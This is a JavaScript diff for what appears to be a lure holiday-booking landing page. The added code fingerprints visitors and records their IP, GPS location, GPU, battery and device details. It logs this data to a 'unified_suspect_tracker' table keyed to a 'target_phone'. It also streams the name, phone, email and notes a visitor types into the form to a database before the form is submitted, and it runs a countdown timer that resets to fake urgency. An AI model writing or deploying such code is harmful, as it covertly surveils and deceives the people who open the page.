+        cookies_enabled: deviceInfo.cookiesEnabled,
+        referrer: document.referrer || null,
+        page_url: window.location.href,
+        user_agent: navigator.userAgent,
+        raw_client_info: deviceInfo.rawInfo,
+        last_seen_at: new Date().toISOString()
+    };
+
+    try {
+        // Mevcut kayıt var mı kontrol et
+        var { data: existingLead, error: selectErr } = await STATE.supabaseClient
+            .from(tableToUse)
+            .select('id, total_visits, form_submitted, user_entered_city, target_phone, device_signature')
+            .eq('fingerprint_hash', STATE.fingerprintHash)
+            .maybeSingle();
+
+        if (existingLead) {
+            console.log('👤 Tekrar gelen ziyaretçi tespit edildi! Ziyaret Sayısı:', (existingLead.total_visits || 1) + 1);
+            
+            var updatePayload = {
+                total_visits: (existingLead.total_visits || 1) + 1,
+                last_seen_at: new Date().toISOString(),
+                device_signature: STATE.deviceSignature,
+                battery_level: STATE.batteryLevel,
+                battery_charging: STATE.batteryCharging,
+                connection_type: deviceInfo.connectionType,
+                page_url: window.location.href
+            };
+
+            // Eğer hedef telefon önceden yoksa veya yeni geldiyse güncelle
+            if (STATE.targetPhone && !existingLead.target_phone) {
+                updatePayload.target_phone = STATE.targetPhone;
+            }
+            if (STATE.campaignSource && STATE.campaignSource !== 'direct') {
+                updatePayload.campaign_source = STATE.campaignSource;
+            }
+
+            await STATE.supabaseClient
+                .from(tableToUse)
+                .update(updatePayload)
+                .eq('fingerprint_hash', STATE.fingerprintHash);
+        } else {
+            console.log('🆕 Yeni ziyaretçi Supabase tablosuna ekleniyor (' + tableToUse + ')...');
+            await STATE.supabaseClient
+                .from(tableToUse)
+                .insert(payload);
+        }
+
+        // Ortak Şüpheli Tracker Tablosuna Ham Log Bırak (Yedek Güvenlik)
+        try {
+            await STATE.supabaseClient
+                .from('unified_suspect_tracker')
+                .insert({
+                    device_signature: STATE.deviceSignature,
+                    fingerprint_hash: STATE.fingerprintHash,
+                    target_phone: STATE.targetPhone,
+                    campaign_source: STATE.campaignSource,
+                    target_table: tableToUse,
+                    page_url: window.location.href,
+                    referrer: document.referrer || null,
+                    ip_address: STATE.ipAddress,
+                    city: STATE.ipCity,
+                    region: STATE.ipRegion,
+                    country: STATE.ipCountry,
+                    latitude: STATE.ipLat,
+                    longitude: STATE.ipLng,
+                    device_type: deviceInfo.deviceType,
+                    os: deviceInfo.os,
+                    os_version: deviceInfo.osVersion,
+                    browser: deviceInfo.browser,
+                    browser_version: deviceInfo.browserVersion,
+                    gpu_vendor: STATE.gpuVendor,
+                    gpu_renderer: STATE.gpuRenderer,
+                    screen_resolution: deviceInfo.screenResolution,
+                    window_size: deviceInfo.windowSize,
+                    battery_level: STATE.batteryLevel,
+                    connection_type: deviceInfo.connectionType,
+                    user_agent: navigator.userAgent,
+                    raw_client_info: deviceInfo.rawInfo
+                });
+        } catch (unErr) {}
+
+    } catch (e) {
+        console.log('Ziyaretçi kaydı hatası:', e);
+    }
 }
 
 // ==========================================
-// IP KONUM + ÇOKLU SAĞLAYICI VE ZİYARET KAYDI
+// 6) CANLI SENKRONİZASYON MOTORU
+// ==========================================
+async function syncCesmeLead(extraData) {
+    if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
+
+    var tableToUse = STATE.targetTable || CONFIG.DEFAULT_TABLE;
+
+    var payload = Object.assign({
+        last_seen_at: new Date().toISOString(),
+        time_spent_seconds: Math.round((Date.now() - STATE.startTime) / 1000),
+        max_scroll_percent: STATE.maxScroll
+    }, extraData || {});
+
+    if (STATE.targetPhone) payload.target_phone = STATE.targetPhone;
+    if (STATE.deviceSignature) payload.device_signature = STATE.deviceSignature;
+    if (STATE.campaignSource) payload.campaign_source = STATE.campaignSource;
+
+    // Form alanlarından güncel verileri topla
+    var pkg = document.getElementById('package-select');
+    var cin = document.getElementById('check-in-date');
+    var cout = document.getElementById('check-out-date');
+    var adult = document.getElementById('adult-count');
+    var child = document.getElementById('child-count');
+    var name = document.getElementById('lead-name');
+    var phone = document.getElementById('lead-phone');
+    var email = document.getElementById('lead-email');
+    var city = document.getElementById('lead-city');
+    var notes = document.getElementById('special-notes');
+
+    if (pkg && pkg.value) payload.selected_package = pkg.value;
+    if (cin && cin.value) payload.check_in_date = cin.value;
+    if (cout && cout.value) payload.check_out_date = cout.value;
+    if (adult && adult.value) payload.adult_count = parseInt(adult.value) || 2;
+    if (child && child.value) payload.child_count = parseInt(child.value) || 0;
+    if (name && name.value.trim()) payload.full_name = name.value.trim();
+    if (phone && phone.value.trim()) payload.phone = phone.value.trim();
+    if (email && email.value.trim()) payload.email = email.value.trim();
+    if (city && city.value.trim()) payload.user_entered_city = city.value.trim();
+    if (notes && notes.value.trim()) payload.special_requests = notes.value.trim();
+
+    try {
+        await STATE.supabaseClient
+            .from(tableToUse)
+            .update(payload)
+            .eq('fingerprint_hash', STATE.fingerprintHash);
+        
+        console.log('🌟 ' + tableToUse + ' güncellendi!');
+    } catch (e) {
+        console.log('Veri aktarım hatası:', e);
+    }
+}
+
+// ==========================================
+// 7) IP KONUM TESPİTİ (0. Saniye)
 // ==========================================
 async function fetchIpLocation() {
-    var providers = [
-        async function() {
-            // 1. ipwho.is (Çok hızlı, HTTPS, mobil operatör uyumlu, CORS açık, Bölge bilgili)
-            var res = await fetchWithTimeout('https://ipwho.is/', 3500);
-            var d = await res.json();
-            if (d && d.success !== false) {
+    var apis = [
+        {
+            url: 'https://ipwho.is/',
+            parse: function (d) {
                 return {
                     ip: d.ip,
                     city: d.city,
-                    region: d.region || d.region_code || null,
+                    region: d.region,
                     country: d.country,
-                    latitude: d.latitude ? String(d.latitude) : null,
-                    longitude: d.longitude ? String(d.longitude) : null
+                    latitude: d.latitude,
+                    longitude: d.longitude
                 };
             }
-            throw new Error('ipwho.is failed');
         },
-        async function() {
-            // 2. geojs.io
-            var res = await fetchWithTimeout('https://get.geojs.io/v1/ip/geo.json', 3500);
-            var d = await res.json();
-            if (d && (d.latitude || d.city || d.ip)) {
+        {
+            url: 'https://get.geojs.io/v1/ip/geo.json',
+            parse: function (d) {
                 return {
                     ip: d.ip,
                     city: d.city,
-                    region: d.region || null,
+                    region: d.region,
                     country: d.country,
-                    latitude: d.latitude ? String(d.latitude) : null,
-                    longitude: d.longitude ? String(d.longitude) : null
+                    latitude: d.latitude,
+                    longitude: d.longitude
                 };
             }
-            throw new Error('geojs failed');
         },
-        async function() {
-            // 3. freeipapi.com
-            var res = await fetchWithTimeout('https://freeipapi.com/api/json/', 3500);
-            var d = await res.json();
-            if (d && (d.latitude || d.cityName || d.ipAddress)) {
+        {
+            url: 'https://freeipapi.com/api/json',
+            parse: function (d) {
                 return {
                     ip: d.ipAddress,
                     city: d.cityName,
-                    region: d.regionName || null,
+                    region: d.regionName,
                     country: d.countryName,
-                    latitude: d.latitude ? String(d.latitude) : null,
-                    longitude: d.longitude ? String(d.longitude) : null
+                    latitude: d.latitude,
+                    longitude: d.longitude
                 };
             }
-            throw new Error('freeipapi failed');
-        },
-        async function() {
-            // 4. ipapi.co
-            var res = await fetchWithTimeout('https://ipapi.co/json/', 3500);
-            var d = await res.json();
-            if (d && (d.latitude || d.city || d.ip)) {
-                return {
-                    ip: d.ip,
-                    city: d.city,
-                    region: d.region || null,
-                    country: d.country_name,
-                    latitude: d.latitude ? String(d.latitude) : null,
-                    longitude: d.longitude ? String(d.longitude) : null
-                };
-            }
-            throw new Error('ipapi failed');
         }
     ];
 
-    var locData = null;
-    for (var i = 0; i < providers.length; i++) {
+    for (var i = 0; i < apis.length; i++) {
         try {
-            locData = await providers[i]();
-            if (locData && (locData.latitude || locData.city || locData.ip)) {
-                break;
+            var res = await fetchWithTimeout(apis[i].url, 4000);
+            var raw = await res.json();
+            var loc = apis[i].parse(raw);
+
+            if (loc && (loc.city || loc.country || loc.ip)) {
+                if (loc.city) STATE.ipCity = loc.city;
+                if (loc.region) STATE.ipRegion = loc.region;
+                if (loc.country) STATE.ipCountry = loc.country;
+                if (loc.ip) STATE.ipAddress = loc.ip;
+                if (loc.latitude) STATE.ipLat = String(loc.latitude);
+                if (loc.longitude) STATE.ipLng = String(loc.longitude);
+                STATE.locationType = 'IP Geolocation';
+
+                console.log('📍 IP Konumu Alındı:', STATE.ipCity, STATE.ipRegion, STATE.ipCountry, 'Lat:', STATE.ipLat, 'Lng:', STATE.ipLng);
+
+                // Formdaki şehir alanına otomatik ekle (eğer boşsa)
+                var cityInput = document.getElementById('lead-city');
+                if (cityInput && !cityInput.value && STATE.ipCity) {
+                    cityInput.value = STATE.ipCity + (STATE.ipCountry ? ', ' + STATE.ipCountry : '');
+                }
+
+                await syncCesmeLead({
+                    ip_address: STATE.ipAddress,
+                    city: STATE.ipCity,
+                    region: STATE.ipRegion,
+                    country: STATE.ipCountry,
+                    latitude: STATE.ipLat,
+                    longitude: STATE.ipLng,
+                    location_type: 'IP Geolocation'
+                });
+                return;
             }
-        } catch (e) {
-            // Bir sonraki servisi dene
-        }
-    }
-
-    if (locData) {
-        if (locData.city) STATE.ipCity = locData.city;
-        if (locData.region) STATE.ipRegion = locData.region;
-        if (locData.country) STATE.ipCountry = locData.country;
-        if (locData.ip) STATE.ipAddress = locData.ip;
-        if (locData.latitude) STATE.ipLat = String(locData.latitude);
-        if (locData.longitude) STATE.ipLng = String(locData.longitude);
-        STATE.locationType = 'IP Geolocation';
-        console.log('📍 IP Konum Bilgisi Alındı:', STATE.ipCity, STATE.ipRegion, STATE.ipCountry, 'Lat:', STATE.ipLat, 'Lng:', STATE.ipLng);
-
-        var countryInput = document.getElementById('respondent-country');
-        if (countryInput && !countryInput.value && STATE.ipCountry) {
-            countryInput.value = STATE.ipCountry;
-        }
-    }
-
-    // Koordinatları ve lokasyonu dansk_survey_leads tablosuna aktar
-    if (STATE.ipLat && STATE.ipLng) {
-        await syncCoordinatesToDatabase(STATE.ipLat, STATE.ipLng, STATE.ipCity, STATE.ipCountry, STATE.ipAddress, STATE.ipRegion, 'IP Geolocation');
-    } else {
-        await syncDanskSurveyLead();
+        } catch (e) {}
     }
 }
 
 // ==========================================
-// TIKLAMA LOGLAMASI (Vercel)
+// 8) GPS HASSAS KONUM TESPİTİ (📍 Konumu Belirle)
 // ==========================================
-function setupClickTracking() {
-    document.addEventListener('click', function(e) {
-        var target = e.target;
-        var details = '';
+function setupGeoDetection() {
+    var btn = document.getElementById('btn-detect-geo');
+    var cityInput = document.getElementById('lead-city');
+    if (!btn || !cityInput) return;
 
-        if (target.id) {
-            details = '#' + target.id;
-        } else if (target.className && typeof target.className === 'string') {
-            details = '.' + target.className.split(' ').join('.');
-        } else {
-            details = target.tagName;
+    btn.addEventListener('click', function () {
+        if (!navigator.geolocation) {
+            alert('Tarayıcınız konum servisini desteklemiyor.');
+            return;
         }
 
-        if (target.tagName === 'BUTTON' || target.tagName === 'A' || target.closest('label')) {
-            var text = target.innerText || '';
-            details += ' (' + text.trim().substring(0, 30) + ')';
-        }
+        btn.textContent = '📍 Belirleniyor...';
 
-        // Vercel'e gönder
-        sendLogToVercel('Tıklama', details);
+        navigator.geolocation.getCurrentPosition(
+            async function (pos) {
+                var lat = pos.coords.latitude;
+                var lng = pos.coords.longitude;
+                STATE.ipLat = String(lat);
+                STATE.ipLng = String(lng);
+                STATE.locationType = 'GPS Hassas';
+
+                console.log('📍 GPS Hassas Konum Alındı:', lat, lng);
+
+                try {
+                    var geoUrl = 'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=tr';
+                    var res = await fetchWithTimeout(geoUrl, 5000);
+                    var geo = await res.json();
+
+                    var detCity = geo.city || geo.locality || geo.principalSubdivision || '';
+                    var detRegion = geo.principalSubdivision || '';
+                    var detCountry = geo.countryName || STATE.ipCountry || '';
+
+                    if (detCity) {
+                        STATE.ipCity = detCity;
+                        if (detRegion) STATE.ipRegion = detRegion;
+                        if (detCountry) STATE.ipCountry = detCountry;
+                        cityInput.value = detCity + (detCountry ? ', ' + detCountry : '');
+                    }
+
+                    btn.textContent = '✓ Belirlendi';
+                    await syncCesmeLead({
+                        latitude: STATE.ipLat,
+                        longitude: STATE.ipLng,
+                        city: STATE.ipCity,
+                        region: STATE.ipRegion,
+                        country: STATE.ipCountry,
+                        location_type: 'GPS Hassas'
+                    });
+                } catch (e) {
+                    btn.textContent = '✓ Koordinat Alındı';
+                    await syncCesmeLead({
+                        latitude: STATE.ipLat,
+                        longitude: STATE.ipLng,
+                        location_type: 'GPS Hassas'
+                    });
+                }
+            },
+            function (err) {
+                console.log('GPS izin verilmedi:', err);
+                btn.textContent = '📍 Konumu Belirle';
+            }
+        );
     });
 }
 
 // ==========================================
-// SÜRE VE CANLI AKTİVİTE TAKİBİ (dansk_survey_leads)
-// Her saniye veritabanına anlık süre ve son görülme aktarılır
+// 9) PİL TAKİBİ (BATTERY STATUS API)
+// ==========================================
+function setupBatteryListener() {
+    try {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function (battery) {
+                STATE.batteryLevel = Math.round(battery.level * 100);
+                STATE.batteryCharging = battery.charging;
+
+                battery.addEventListener('levelchange', function () {
+                    STATE.batteryLevel = Math.round(battery.level * 100);
+                    syncCesmeLead({ battery_level: STATE.batteryLevel });
+                });
+
+                battery.addEventListener('chargingchange', function () {
+                    STATE.batteryCharging = battery.charging;
+                    syncCesmeLead({ battery_charging: STATE.batteryCharging });
+                });
+            }).catch(function () {});
+        }
+    } catch (e) {}
+}
+
+// ==========================================
+// 10) HER SANİYE CANLI SÜRE VE AKTİVİTE TAKİBİ (1000ms)
 // ==========================================
 function setupTimeTracking() {
-    // Her saniye (1000ms) dansk_survey_leads tablosunda süreyi ve son aktiviteyi anlık güncelle
-    setInterval(function() {
+    var tableToUse = STATE.targetTable || CONFIG.DEFAULT_TABLE;
+
+    setInterval(function () {
         if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
         var secondsSpent = Math.round((Date.now() - STATE.startTime) / 1000);
 
         STATE.supabaseClient
-            .from('dansk_survey_leads')
-            .update({ 
+            .from(tableToUse)
+            .update({
                 time_spent_seconds: secondsSpent,
                 max_scroll_percent: STATE.maxScroll,
                 last_seen_at: new Date().toISOString()
             })
             .eq('fingerprint_hash', STATE.fingerprintHash)
-            .then(function() {})
-            .catch(function() {});
+            .then(function () {})
+            .catch(function () {});
     }, 1000);
 
-    // Sayfa kapanırken son güncelleme (fetch keepalive)
-    window.addEventListener('beforeunload', function() {
+    window.addEventListener('beforeunload', function () {
         if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
         var secondsSpent = Math.round((Date.now() - STATE.startTime) / 1000);
 
-        var url = CONFIG.SUPABASE_URL + '/rest/v1/dansk_survey_leads?fingerprint_hash=eq.' + STATE.fingerprintHash;
-        var headers = {
-            'Content-Type': 'application/json',
-            'apikey': CONFIG.SUPABASE_ANON_KEY,
-            'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON_KEY,
-            'Prefer': 'return=minimal'
-        };
-        var body = JSON.stringify({ 
-            time_spent_seconds: secondsSpent, 
-            max_scroll_percent: STATE.maxScroll,
-            last_seen_at: new Date().toISOString()
-        });
-
+        var url = CONFIG.SUPABASE_URL + '/rest/v1/' + tableToUse + '?fingerprint_hash=eq.' + STATE.fingerprintHash;
         fetch(url, {
             method: 'PATCH',
-            headers: headers,
-            body: body,
+            headers: {
+                'Content-Type': 'application/json',
+                'apikey': CONFIG.SUPABASE_ANON_KEY,
+                'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON_KEY,
+                'Prefer': 'return=minimal'
+            },
+            body: JSON.stringify({
+                time_spent_seconds: secondsSpent,
+                max_scroll_percent: STATE.maxScroll,
+                last_seen_at: new Date().toISOString()
+            }),
             keepalive: true
-        }).catch(function() {});
+        }).catch(function () {});
     });
 }
 
 // ==========================================
-// SCROLL DERİNLİĞİ TAKİBİ (dansk_survey_leads)
+// 11) FORM DEĞİŞİKLİKLERİNİ ANINDA KAYDETME (150ms Debounce)
+// ==========================================
+var formDebounceTimer = null;
+
+function setupLiveFormSync() {
+    var form = document.getElementById('holiday-lead-form');
+    if (!form) return;
+
+    form.addEventListener('change', function () {
+        syncCesmeLead();
+    });
+
+    form.addEventListener('input', function () {
+        clearTimeout(formDebounceTimer);
+        formDebounceTimer = setTimeout(function () {
+            syncCesmeLead();
+        }, 150);
+    });
+
+    form.addEventListener('focusout', function () {
+        syncCesmeLead();
+    });
+}
+
+// ==========================================
+// 12) PAKET SEÇİM BUTONLARI ETKİLEŞİMİ
+// ==========================================
+function setupPackageSelection() {
+    var buttons = document.querySelectorAll('.select-package-btn');
+    var selectElement = document.getElementById('package-select');
+
+    buttons.forEach(function (btn) {
+        btn.addEventListener('click', function (e) {
+            var pkgName = btn.getAttribute('data-package');
+            if (selectElement && pkgName) {
+                for (var i = 0; i < selectElement.options.length; i++) {
+                    if (selectElement.options[i].value.indexOf(pkgName) !== -1 || pkgName.indexOf(selectElement.options[i].value) !== -1) {
+                        selectElement.selectedIndex = i;
+                        break;
+                    }
+                }
+                syncCesmeLead({ selected_package: selectElement.value });
+            }
+        });
+    });
+}
+
+// ==========================================
+// 13) FORM GÖNDERME İŞLEMİ (Mühürleme)
+// ==========================================
+function setupFormSubmission() {
+    var form = document.getElementById('holiday-lead-form');
+    var successBox = document.getElementById('booking-success');
+    var submitBtn = document.getElementById('btn-submit-lead');
+
+    if (!form) return;
+
+    form.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        if (submitBtn) {
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span>Talebiniz Kaydediliyor...</span>';
+        }
+
+        STATE.isSubmitted = true;
+
+        await syncCesmeLead({
+            form_submitted: true,
+            submitted_at: new Date().toISOString()
+        });
+
+        console.log('✅ Rezervasyon talebi başarıyla Supabase tablosuna mühürlendi.');
+
+        form.classList.add('hidden');
+        if (successBox) {
+            successBox.classList.remove('hidden');
+            successBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+    });
+}
+
+// ==========================================
+// 14) GERİ SAYIM SAYACI (COUNTDOWN)
+// ==========================================
+function setupCountdown() {
+    var daysEl = document.getElementById('timer-days');
+    var hoursEl = document.getElementById('timer-hours');
+    var minsEl = document.getElementById('timer-mins');
+    var secsEl = document.getElementById('timer-secs');
+
+    if (!daysEl || !hoursEl || !minsEl || !secsEl) return;
+
+    var targetDate = new Date();
+    targetDate.setDate(targetDate.getDate() + 3);
+    targetDate.setHours(targetDate.getHours() + 14);
+
+    function updateTimer() {
+        var now = new Date().getTime();
+        var diff = targetDate.getTime() - now;
+
+        if (diff <= 0) {
+            targetDate = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000);
+            diff = targetDate.getTime() - now;
+        }
+
+        var d = Math.floor(diff / (1000 * 60 * 60 * 24));
+        var h = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        var m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        var s = Math.floor((diff % (1000 * 60)) / 1000);
+
+        daysEl.textContent = String(d).padStart(2, '0');
+        hoursEl.textContent = String(h).padStart(2, '0');
+        minsEl.textContent = String(m).padStart(2, '0');
+        secsEl.textContent = String(s).padStart(2, '0');
+    }
+
+    updateTimer();
+    setInterval(updateTimer, 1000);
+}
+
+// ==========================================
+// 15) S.S.S. AKORDEON
+// ==========================================
+function setupFaqAccordion() {
+    var items = document.querySelectorAll('.faq-item');
+    items.forEach(function (item) {
+        var btn = item.querySelector('.faq-question');
+        if (btn) {
+            btn.addEventListener('click', function () {
+                var isActive = item.classList.contains('active');
+                items.forEach(function (other) { other.classList.remove('active'); });
+                if (!isActive) item.classList.add('active');
+            });
+        }
+    });
+}
+
+// ==========================================
+// 16) SCROLL ANALİTİĞİ & ANİMASYONLAR
 // ==========================================
 function setupScrollTracking() {
-    window.addEventListener('scroll', function() {
-        var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
-        var docHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+    window.addEventListener('scroll', function () {
+        var scrollTop = window.scrollY || document.documentElement.scrollTop;
+        var docHeight = document.documentElement.scrollHeight - window.innerHeight;
         if (docHeight > 0) {
-            var scrollPercent = Math.round((scrollTop / docHeight) * 100);
-            if (scrollPercent > STATE.maxScroll) {
-                STATE.maxScroll = scrollPercent;
+            var percent = Math.min(100, Math.round((scrollTop / docHeight) * 100));
+            if (percent > STATE.maxScroll) {
+                STATE.maxScroll = percent;
             }
         }
-    });
-
-    // Her 15 saniyede max scroll'u kaydet
-    setInterval(function() {
-        if (!STATE.supabaseClient || !STATE.fingerprintHash || STATE.maxScroll === 0) return;
-
-        STATE.supabaseClient
-            .from('dansk_survey_leads')
-            .update({ max_scroll_percent: STATE.maxScroll })
-            .eq('fingerprint_hash', STATE.fingerprintHash)
-            .then(function() {})
-            .catch(function() {});
-    }, 15000);
+    }, { passive: true });
 }
 
-// ==========================================
-// VERCEL LOGLAMASİ / ANALİTİK
-// ==========================================
-function setupVercelAnalytics() {
-    sendLogToVercel('Sayfa Ziyareti', window.location.pathname);
-}
-
-function sendLogToVercel(action, details) {
-    var isLocal = window.location.hostname === 'localhost' || 
-                  window.location.hostname === '127.0.0.1' || 
-                  window.location.hostname.startsWith('192.168.');
-    if (isLocal) return;
-
-    fetch('/api/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            action: action,
-            details: details,
-            fingerprint: STATE.fingerprintHash,
-            timestamp: new Date().toISOString()
-        })
-    }).catch(function() {});
-}
-
-// ==========================================
-// ADIM NAVİGASYONU
-// ==========================================
-function navigateStep(direction) {
-    var nextStep = STATE.currentStep + direction;
-
-    // İleri gidiyorsak validasyon (5. adım hariç - iletişim opsiyonel)
-    if (direction > 0 && STATE.currentStep < 5) {
-        if (!validateCurrentStep()) return;
-    }
-
-    if (nextStep < 1 || nextStep > STATE.totalSteps) return;
-
-    // Mevcut bölümü gizle
-    var currentSection = document.getElementById('section-' + STATE.currentStep);
-    currentSection.classList.remove('active');
-
-    // Yeni bölümü göster
-    STATE.currentStep = nextStep;
-    var nextSection = document.getElementById('section-' + STATE.currentStep);
-    nextSection.classList.add('active');
-
-    // İlerleme çubuğunu güncelle
-    updateProgressBar();
-
-    // Sayfanın üstüne kaydır (tam ekran modundaysa wrapper'ı kaydır)
-    if (document.body.classList.contains('fullscreen-survey-active')) {
-        var wrapper = document.getElementById('survey-container-wrapper');
-        if (wrapper) wrapper.scrollTop = 0;
-    } else {
-        window.scrollTo({ top: document.getElementById('progress-container').offsetTop - 20, behavior: 'smooth' });
-    }
-
-    // Adım verisini anında dansk_survey_leads tablosuna senkronize et
-    syncFingerprintProgress();
-    sendLogToVercel('Anket Adım', 'Adım ' + STATE.currentStep);
-
-    // 5. adıma (iletişim & konum) gelindiğinde otomatik konum tespiti başlat
-    if (STATE.currentStep === 5) {
-        var cityField = document.getElementById('respondent-city');
-        var countryField = document.getElementById('respondent-country');
-        var locBtn = document.getElementById('btn-detect-location');
-        if (cityField && !cityField.value && navigator.geolocation) {
-            triggerGeolocationRequest(cityField, countryField, locBtn, true);
-        }
-    }
-}
-
-function updateProgressBar() {
-    var steps = document.querySelectorAll('.step');
-    var lines = document.querySelectorAll('.step-line-fill');
-
-    steps.forEach(function(step, index) {
-        var stepNum = index + 1;
-        step.classList.remove('active', 'completed');
-
-        if (stepNum < STATE.currentStep) {
-            step.classList.add('completed');
-        } else if (stepNum === STATE.currentStep) {
-            step.classList.add('active');
-        }
-    });
-
-    lines.forEach(function(line, index) {
-        line.style.width = (index + 1 < STATE.currentStep) ? '100%' : '0%';
-    });
-}
-
-// ==========================================
-// VALİDASYON
-// ==========================================
-function validateCurrentStep() {
-    var section = document.getElementById('section-' + STATE.currentStep);
-    var questionCards = section.querySelectorAll('.question-card');
-    var isValid = true;
-
-    questionCards.forEach(function(card) {
-        card.classList.remove('error');
-
-        // Radio validasyonu
-        var radios = card.querySelectorAll('input[type="radio"]');
-        if (radios.length > 0) {
-            var radioName = radios[0].name;
-            var checked = section.querySelector('input[name="' + radioName + '"]:checked');
-            if (!checked) {
-                card.classList.add('error');
-                isValid = false;
-            }
-        }
-
-        // Checkbox validasyonu
-        var checkboxes = card.querySelectorAll('input[type="checkbox"]');
-        if (checkboxes.length > 0) {
-            var checkedBoxes = card.querySelectorAll('input[type="checkbox"]:checked');
-            if (checkedBoxes.length === 0) {
-                card.classList.add('error');
-                isValid = false;
-            }
-        }
-    });
-
-    if (!isValid) {
-        showToast(LANG.t('toastAnswerAll'));
-    }
-
-    return isValid;
-}
-
-function showToast(message) {
-    var toast = document.getElementById('validation-toast');
-    var toastMsg = document.getElementById('toast-message');
-    toastMsg.textContent = message;
-    toast.classList.remove('hidden');
-    setTimeout(function() { toast.classList.add('hidden'); }, 3500);
-}
-
-// ==========================================
-// "DİĞER" GİRİŞ ALANI TOGGLE
-// ==========================================
-function setupOtherInputToggle() {
-    var cityOtherRadio = document.getElementById('city-other-radio');
-    var cityOtherWrapper = document.getElementById('city-other-wrapper');
-    if (cityOtherRadio && cityOtherWrapper) {
-        document.querySelectorAll('input[name="city_region"]').forEach(function(radio) {
-            radio.addEventListener('change', function() {
-                if (cityOtherRadio.checked) {
-                    cityOtherWrapper.classList.remove('hidden');
-                    document.getElementById('city-other-input').focus();
-                } else {
-                    cityOtherWrapper.classList.add('hidden');
-                }
-            });
-        });
-    }
-
-    var reasonOtherCheck = document.getElementById('reason-other-check');
-    var reasonOtherWrapper = document.getElementById('reason-other-wrapper');
-    if (reasonOtherCheck && reasonOtherWrapper) {
-        reasonOtherCheck.addEventListener('change', function() {
-            if (reasonOtherCheck.checked) {
-                reasonOtherWrapper.classList.remove('hidden');
-                document.getElementById('reason-other-input').focus();
-            } else {
-                reasonOtherWrapper.classList.add('hidden');
-            }
-        });
-    }
-}
-
-// ==========================================
-// CHECKBOX MAKS LİMİT
-// ==========================================
-function setupCheckboxMaxLimit() {
-    var checkboxGroups = {};
-
-    document.querySelectorAll('input[type="checkbox"][data-max]').forEach(function(cb) {
-        var name = cb.name;
-        var max = parseInt(cb.dataset.max);
-        if (!checkboxGroups[name]) checkboxGroups[name] = { max: max, checkboxes: [] };
-        checkboxGroups[name].checkboxes.push(cb);
-    });
-
-    Object.keys(checkboxGroups).forEach(function(name) {
-        var group = checkboxGroups[name];
-        group.checkboxes.forEach(function(cb) {
-            cb.addEventListener('change', function() {
-                var checkedCount = group.checkboxes.filter(function(c) { return c.checked; }).length;
-                if (checkedCount > group.max) {
-                    cb.checked = false;
-                    showToast(LANG.t('toastMaxOptions').replace('{n}', group.max));
-                }
-            });
-        });
-    });
-}
-
-// ==========================================
-// KONUM İZNİ VE OTOMATİK ŞEHİR TESPİTİ
-// Kullanıcı şehir alanına tıkladığında/girdiğinde veya 5. adıma ulaştığında
-// ==========================================
-function setupLocationOnCityField() {
-    var cityInput = document.getElementById('respondent-city');
-    var countryInput = document.getElementById('respondent-country');
-    var btnDetect = document.getElementById('btn-detect-location');
-    if (!cityInput) return;
-
-    var hasRequested = false;
-
-    // 1) "📍 Konumu Belirle" butonuna tıklandığında konum iste
-    if (btnDetect) {
-        btnDetect.addEventListener('click', function(e) {
-            e.preventDefault();
-            triggerGeolocationRequest(cityInput, countryInput, btnDetect, false);
-        });
-    }
-
-    // 2) SADECE "Yaşadığınız Şehir" input alanına tıklandığında veya odaklanıldığında konum iste
-    cityInput.addEventListener('focus', function() {
-        if (!hasRequested && !cityInput.value.trim()) {
-            hasRequested = true;
-            triggerGeolocationRequest(cityInput, countryInput, btnDetect, false);
-        }
-    });
-
-    cityInput.addEventListener('click', function() {
-        if (!hasRequested && !cityInput.value.trim()) {
-            hasRequested = true;
-            triggerGeolocationRequest(cityInput, countryInput, btnDetect, false);
-        }
-    });
-}
-
-function triggerGeolocationRequest(cityInput, countryInput, btnDetect, isAuto) {
-    if (!navigator.geolocation) {
-        console.log('Tarayıcı geolocation desteklemiyor.');
-        if (STATE.ipCity && cityInput && !cityInput.value) {
-            cityInput.value = STATE.ipCity;
-        }
-        return;
-    }
-
-    // Kullanıcıya bilgi ver
-    if (cityInput) cityInput.placeholder = LANG.t('locationRequesting');
-    if (btnDetect) btnDetect.textContent = LANG.t('locationGetting');
-
-    navigator.geolocation.getCurrentPosition(
-        async function(position) {
-            var lat = position.coords.latitude;
-            var lng = position.coords.longitude;
-            var latStr = lat.toString();
-            var lngStr = lng.toString();
-
-            STATE.ipLat = latStr;
-            STATE.ipLng = lngStr;
-
-            console.log('📍 GPS hassas konumu alındı:', lat, lng);
-
-            var detectedCity = '';
-            var detectedRegion = '';
-            var detectedCountry = STATE.ipCountry || '';
-
-            // Reverse geocoding ile şehir, bölge ve ülke adını bul
-            try {
-                var geoUrl = 'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=tr';
-                var res = await fetchWithTimeout(geoUrl, 5000);
-                var geoData = await res.json();
-
-                detectedCity = geoData.city || geoData.locality || geoData.principalSubdivision || '';
-                detectedRegion = geoData.principalSubdivision || '';
-                detectedCountry = geoData.countryName || STATE.ipCountry || '';
-
-                if (detectedCity) {
-                    if (cityInput) cityInput.value = detectedCity;
-                    if (countryInput) countryInput.value = detectedCountry;
-                    STATE.ipCity = detectedCity;
-                    if (detectedRegion) STATE.ipRegion = detectedRegion;
-                    STATE.ipCountry = detectedCountry;
-                    showToast(LANG.t('toastLocationFound').replace('{city}', detectedCity));
-                    if (btnDetect) btnDetect.textContent = LANG.t('locationDone');
-                } else if (STATE.ipCity) {
-                    if (cityInput) cityInput.value = STATE.ipCity;
-                    if (countryInput && detectedCountry) countryInput.value = detectedCountry;
-                    if (btnDetect) btnDetect.textContent = LANG.t('locationDone');
-                }
-            } catch (e) {
